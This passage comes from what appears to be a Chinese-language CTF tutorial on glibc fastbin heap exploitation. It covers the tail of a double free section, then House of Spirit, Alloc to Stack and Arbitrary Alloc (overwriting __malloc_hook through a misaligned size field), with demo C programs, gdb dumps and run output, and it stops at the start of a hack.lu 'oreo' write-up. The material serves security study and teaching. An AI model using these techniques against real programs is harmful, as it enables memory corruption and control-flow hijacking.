</code></pre></div> 在我的系統上 chunk_b 輸出的值會是 0x601090，這個值位於bss段中正是我們之前設置的<code>CHUNK bss_chunk</code> <div class=highlight><pre><span></span><code>Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 &lt;bss_chunk&gt;:   0x0000000000000000  0x0000000000000021
0x601090 &lt;bss_chunk+16&gt;:0x0000000000000000  0x0000000000000000
0x6010a0:               0x0000000000000000  0x0000000000000000
0x6010b0:               0x0000000000000000  0x0000000000000000
0x6010c0:               0x0000000000000000  0x0000000000000000
</code></pre></div> 值得注意的是，我們在 main 函數的第一步就進行了<code>bss_chunk.size=0x21;</code>的操作，這是因爲_int_malloc會對欲分配位置的 size 域進行驗證，如果其 size 與當前 fastbin 鏈表應有 size 不符就會拋出異常。 <div class=highlight><pre><span></span><code>*** Error in `./tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放棄 (核心已轉儲)
</code></pre></div> _int_malloc 中的校驗如下 <div class=highlight><pre><span></span><code>if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
    {
      errstr = &quot;malloc(): memory corruption (fast)&quot;;
    errout:
      malloc_printerr (check_action, errstr, chunk2mem (victim));
      return NULL;
}
</code></pre></div></p> <h3 id=_5>小總結<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <p>通過 fastbin double free 我們可以使用多個指針控制同一個堆塊，這可以用於篡改一些堆塊中的關鍵數據域或者是實現類似於類型混淆的效果。 如果更進一步修改 fd 指針，則能夠實現任意地址分配堆塊的效果( 首先要通過驗證 )，這就相當於任意地址寫任意值的效果。</p> <h2 id=house-of-spirit>House Of Spirit<a class=headerlink href=#house-of-spirit title="Permanent link">&para;</a></h2> <h3 id=_6>介紹<a class=headerlink href=#_6 title="Permanent link">&para;</a></h3> <p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一種技術。</p> <p>該技術的核心在於在目標位置處僞造 fastbin chunk，並將其釋放，從而達到分配<strong>指定地址</strong>的 chunk 的目的。</p> <p>要想構造 fastbin fake chunk，並且將其釋放時，可以將其放入到對應的 fastbin 鏈表中，需要繞過一些必要的檢測，即</p> <ul> <li>fake chunk 的 ISMMAP 位不能爲1，因爲 free 時，如果是 mmap 的 chunk，會單獨處理。</li> <li>fake chunk 地址需要對齊， MALLOC_ALIGN_MASK</li> <li>fake chunk 的 size 大小需要滿足對應的 fastbin 的需求，同時也得對齊。</li> <li>fake chunk 的 next chunk 的大小不能小於 <code>2 * SIZE_SZ</code>，同時也不能大於<code>av-&gt;system_mem</code> 。</li> <li>fake chunk 對應的 fastbin 鏈表頭部不能是該 fake chunk，即不能構成 double free 的情況。</li> </ul> <p>至於爲什麼要繞過這些檢測，可以參考 free 部分的源碼。</p> <h3 id=_7>演示<a class=headerlink href=#_7 title="Permanent link">&para;</a></h3> <p>這裏就直接以 how2heap 上的例子進行說明，如下</p> <div class=highlight><pre><span></span><code><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
<span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdlib.h&gt;</span>

<span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This file demonstrates the house of spirit attack.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=o>*</span><span class=n>a</span><span class=p>;</span>
<span class=w>    </span><span class=c1>// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=n>__attribute__</span><span class=w> </span><span class=p>((</span><span class=n>aligned</span><span class=w> </span><span class=p>(</span><span class=mi>16</span><span class=p>)));</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>fake_chunks</span><span class=p>),</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>7</span><span class=p>]);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x40</span><span class=p>;</span><span class=w> </span><span class=c1>// this is the size</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=c1>// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
<span class=w>    </span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1234</span><span class=p>;</span><span class=w> </span><span class=c1>// nextsize</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>

<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
<span class=w>    </span><span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=w> </span><span class=s>&quot;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
<span class=p>}</span>
</code></pre></div> <p>運行後的效果如下</p> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>how2heap<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>./house_of_spirit
This<span class=w> </span>file<span class=w> </span>demonstrates<span class=w> </span>the<span class=w> </span>house<span class=w> </span>of<span class=w> </span>spirit<span class=w> </span>attack.
Calling<span class=w> </span>malloc<span class=o>()</span><span class=w> </span>once<span class=w> </span>so<span class=w> </span>that<span class=w> </span>it<span class=w> </span>sets<span class=w> </span>up<span class=w> </span>its<span class=w> </span>memory.
We<span class=w> </span>will<span class=w> </span>now<span class=w> </span>overwrite<span class=w> </span>a<span class=w> </span>pointer<span class=w> </span>to<span class=w> </span>point<span class=w> </span>to<span class=w> </span>a<span class=w> </span>fake<span class=w> </span><span class=s1>&#39;fastbin&#39;</span><span class=w> </span>region.
This<span class=w> </span>region<span class=w> </span><span class=o>(</span>memory<span class=w> </span>of<span class=w> </span>length:<span class=w> </span><span class=m>80</span><span class=o>)</span><span class=w> </span>contains<span class=w> </span>two<span class=w> </span>chunks.<span class=w> </span>The<span class=w> </span>first<span class=w> </span>starts<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa58<span class=w> </span>and<span class=w> </span>the<span class=w> </span>second<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa88.
This<span class=w> </span>chunk.size<span class=w> </span>of<span class=w> </span>this<span class=w> </span>region<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span><span class=m>16</span><span class=w> </span>more<span class=w> </span>than<span class=w> </span>the<span class=w> </span>region<span class=w> </span><span class=o>(</span>to<span class=w> </span>accomodate<span class=w> </span>the<span class=w> </span>chunk<span class=w> </span>data<span class=o>)</span><span class=w> </span><span class=k>while</span><span class=w> </span>still<span class=w> </span>falling<span class=w> </span>into<span class=w> </span>the<span class=w> </span>fastbin<span class=w> </span>category<span class=w> </span><span class=o>(</span>&lt;<span class=o>=</span><span class=w> </span><span class=m>128</span><span class=w> </span>on<span class=w> </span>x64<span class=o>)</span>.<span class=w> </span>The<span class=w> </span>PREV_INUSE<span class=w> </span><span class=o>(</span>lsb<span class=o>)</span><span class=w> </span>bit<span class=w> </span>is<span class=w> </span>ignored<span class=w> </span>by<span class=w> </span>free<span class=w> </span><span class=k>for</span><span class=w> </span>fastbin-sized<span class=w> </span>chunks,<span class=w> </span>however<span class=w> </span>the<span class=w> </span>IS_MMAPPED<span class=w> </span><span class=o>(</span>second<span class=w> </span>lsb<span class=o>)</span><span class=w> </span>and<span class=w> </span>NON_MAIN_ARENA<span class=w> </span><span class=o>(</span>third<span class=w> </span>lsb<span class=o>)</span><span class=w> </span>bits<span class=w> </span>cause<span class=w> </span>problems.
...<span class=w> </span>note<span class=w> </span>that<span class=w> </span>this<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span>the<span class=w> </span>size<span class=w> </span>of<span class=w> </span>the<span class=w> </span>next<span class=w> </span>malloc<span class=w> </span>request<span class=w> </span>rounded<span class=w> </span>to<span class=w> </span>the<span class=w> </span>internal<span class=w> </span>size<span class=w> </span>used<span class=w> </span>by<span class=w> </span>the<span class=w> </span>malloc<span class=w> </span>implementation.<span class=w> </span>E.g.<span class=w> </span>on<span class=w> </span>x64,<span class=w> </span>0x30-0x38<span class=w> </span>will<span class=w> </span>all<span class=w> </span>be<span class=w> </span>rounded<span class=w> </span>to<span class=w> </span>0x40,<span class=w> </span>so<span class=w> </span>they<span class=w> </span>would<span class=w> </span>work<span class=w> </span><span class=k>for</span><span class=w> </span>the<span class=w> </span>malloc<span class=w> </span>parameter<span class=w> </span>at<span class=w> </span>the<span class=w> </span>end.
The<span class=w> </span>chunk.size<span class=w> </span>of<span class=w> </span>the<span class=w> </span>*next*<span class=w> </span>fake<span class=w> </span>region<span class=w> </span>has<span class=w> </span>to<span class=w> </span>be<span class=w> </span>sane.<span class=w> </span>That<span class=w> </span>is<span class=w> </span>&gt;<span class=w> </span><span class=m>2</span>*SIZE_SZ<span class=w> </span><span class=o>(</span>&gt;<span class=w> </span><span class=m>16</span><span class=w> </span>on<span class=w> </span>x64<span class=o>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>&lt;<span class=w> </span>av-&gt;system_mem<span class=w> </span><span class=o>(</span>&lt;<span class=w> </span>128kb<span class=w> </span>by<span class=w> </span>default<span class=w> </span><span class=k>for</span><span class=w> </span>the<span class=w> </span>main<span class=w> </span>arena<span class=o>)</span><span class=w> </span>to<span class=w> </span>pass<span class=w> </span>the<span class=w> </span>nextsize<span class=w> </span>integrity<span class=w> </span>checks.<span class=w> </span>No<span class=w> </span>need<span class=w> </span><span class=k>for</span><span class=w> </span>fastbin<span class=w> </span>size.
Now<span class=w> </span>we<span class=w> </span>will<span class=w> </span>overwrite<span class=w> </span>our<span class=w> </span>pointer<span class=w> </span>with<span class=w> </span>the<span class=w> </span>address<span class=w> </span>of<span class=w> </span>the<span class=w> </span>fake<span class=w> </span>region<span class=w> </span>inside<span class=w> </span>the<span class=w> </span>fake<span class=w> </span>first<span class=w> </span>chunk,<span class=w> </span>0x7ffd9bceaa58.
...<span class=w> </span>note<span class=w> </span>that<span class=w> </span>the<span class=w> </span>memory<span class=w> </span>address<span class=w> </span>of<span class=w> </span>the<span class=w> </span>*region*<span class=w> </span>associated<span class=w> </span>with<span class=w> </span>this<span class=w> </span>chunk<span class=w> </span>must<span class=w> </span>be<span class=w> </span><span class=m>16</span>-byte<span class=w> </span>aligned.
Freeing<span class=w> </span>the<span class=w> </span>overwritten<span class=w> </span>pointer.
Now<span class=w> </span>the<span class=w> </span>next<span class=w> </span>malloc<span class=w> </span>will<span class=w> </span><span class=k>return</span><span class=w> </span>the<span class=w> </span>region<span class=w> </span>of<span class=w> </span>our<span class=w> </span>fake<span class=w> </span>chunk<span class=w> </span>at<span class=w> </span>0x7ffd9bceaa58,<span class=w> </span>which<span class=w> </span>will<span class=w> </span>be<span class=w> </span>0x7ffd9bceaa60!
malloc<span class=o>(</span>0x30<span class=o>)</span>:<span class=w> </span>0x7ffd9bceaa60
</code></pre></div> <h3 id=_8>小總結<a class=headerlink href=#_8 title="Permanent link">&para;</a></h3> <p>可以看出，想要使用該技術分配 chunk 到指定地址，其實並不需要修改指定地址的任何內容，<strong>關鍵是要能夠修改指定地址的前後的內容使其可以繞過對應的檢測</strong>。</p> <h2 id=alloc-to-stack>Alloc to Stack<a class=headerlink href=#alloc-to-stack title="Permanent link">&para;</a></h2> <h3 id=_9>介紹<a class=headerlink href=#_9 title="Permanent link">&para;</a></h3> <p>如果你已經理解了前文所講的 Fastbin Double Free 與 house of spirit 技術，那麼理解該技術就已經不成問題了，它們的本質都在於 fastbin 鏈表的特性：當前 chunk 的 fd 指針指向下一個 chunk。</p> <p>該技術的核心點在於劫持 fastbin 鏈表中 chunk 的 fd 指針，把 fd 指針指向我們想要分配的棧上，從而實現控制棧中的一些關鍵數據，比如返回地址等。</p> <h3 id=_10>演示<a class=headerlink href=#_10 title="Permanent link">&para;</a></h3> <p>這次我們把 fake_chunk 置於棧中稱爲 stack_chunk，同時劫持了 fastbin 鏈表中 chunk 的 fd 值，通過把這個 fd 值指向 stack_chunk 就可以實現在棧中分配 fastbin chunk。 <div class=highlight><pre><span></span><code>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&amp;stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
</code></pre></div> 通過 gdb 調試可以看到我們首先把 chunk1 的 fd 指針指向了 stack_chunk <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1
0x602010:   0x00007fffffffde60  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk
</code></pre></div> 之後第一次 malloc 使得 fastbin 鏈表指向了 stack_chunk，這意味着下一次分配會使用 stack_chunk 的內存進行 <div class=highlight><pre><span></span><code>0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin
0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]
0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000
</code></pre></div> 最終第二次malloc返回值爲0x00007fffffffde70也就是stack_chunk <div class=highlight><pre><span></span><code>   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;
 → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
</code></pre></div></p> <h3 id=_11>小總結<a class=headerlink href=#_11 title="Permanent link">&para;</a></h3> <p>通過該技術我們可以把 fastbin chunk 分配到棧中，從而控制返回地址等關鍵數據。要實現這一點我們需要劫持fastbin 中 chunk 的 fd 域，把它指到棧上，當然同時需要棧上存在有滿足條件的size值。</p> <h2 id=arbitrary-alloc>Arbitrary Alloc<a class=headerlink href=#arbitrary-alloc title="Permanent link">&para;</a></h2> <h3 id=_12>介紹<a class=headerlink href=#_12 title="Permanent link">&para;</a></h3> <p>Arbitrary Alloc 其實與 Alloc to stack 是完全相同的，唯一的區別是分配的目標不再是棧中。 事實上只要滿足目標地址存在合法的 size 域（這個 size 域是構造的，還是自然存在的都無妨），我們可以把 chunk 分配到任意的可寫內存中，比如bss、heap、data、stack等等。</p> <h3 id=_13>演示<a class=headerlink href=#_13 title="Permanent link">&para;</a></h3> <p>在這個例子，我們使用字節錯位來實現直接分配 fastbin 到<strong>_malloc_hook的位置，相當於覆蓋_malloc_hook來控制程序流程。</strong> <div class=highlight><pre><span></span><code>int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
</code></pre></div> 這裏的0x7ffff7dd1af5是我根據本機的情況得出的值，這個值是怎麼獲得的呢？首先我們要觀察欲寫入地址附近是否存在可以字節錯位的情況。 <div class=highlight><pre><span></span><code>0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
</code></pre></div> 0x7ffff7dd1b10 是我們想要控制的 __malloc_hook 的地址，於是我們向上尋找是否可以錯位出一個合法的size域。因爲這個程序是 64 位的，因此 fastbin 的範圍爲32字節到128字節(0x20-0x80)，如下： <div class=highlight><pre><span></span><code>//這裏的size指用戶區域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
</code></pre></div> 通過觀察發現 0x7ffff7dd1af5 處可以現實錯位構造出一個0x000000000000007f <div class=highlight><pre><span></span><code>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
</code></pre></div> 因爲 0x7f 在計算 fastbin index 時，是屬於 index 5 的，即 chunk 大小爲 0x70 的。</p> <p><div class=highlight><pre><span></span><code><span class=cp>##define fastbin_index(sz)                                                      \</span>
<span class=cp>    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
</code></pre></div> （注意sz的大小是unsigned int，因此只佔4個字節）</p> <p>而其大小又包含了 0x10 的 chunk_header，因此我們選擇分配 0x60 的 fastbin，將其加入鏈表。 最後經過兩次分配可以觀察到 chunk 被分配到 0x7ffff7dd1afd，因此我們就可以直接控制 __malloc_hook的內容(在我的libc中__realloc_hook與__malloc_hook是在連在一起的)。</p> <div class=highlight><pre><span></span><code>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f
0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000
0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
</code></pre></div> <h3 id=_14>小總結<a class=headerlink href=#_14 title="Permanent link">&para;</a></h3> <p>Arbitrary Alloc 在 CTF 中用地更加頻繁。我們可以利用字節錯位等方法來繞過 size 域的檢驗，實現任意地址分配 chunk，最後的效果也就相當於任意地址寫任意值。</p> <h2 id=2014-hacklu-oreo>2014 hack.lu oreo<a class=headerlink href=#2014-hacklu-oreo title="Permanent link">&para;</a></h2> <p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo>題目鏈接</a></p> <h3 id=_15>基本分析<a class=headerlink href=#_15 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>➜<span class=w>  </span>2014_Hack.lu_oreo<span class=w> </span>git:<span class=o>(</span>master<span class=o>)</span><span class=w> </span>file<span class=w> </span>oreo
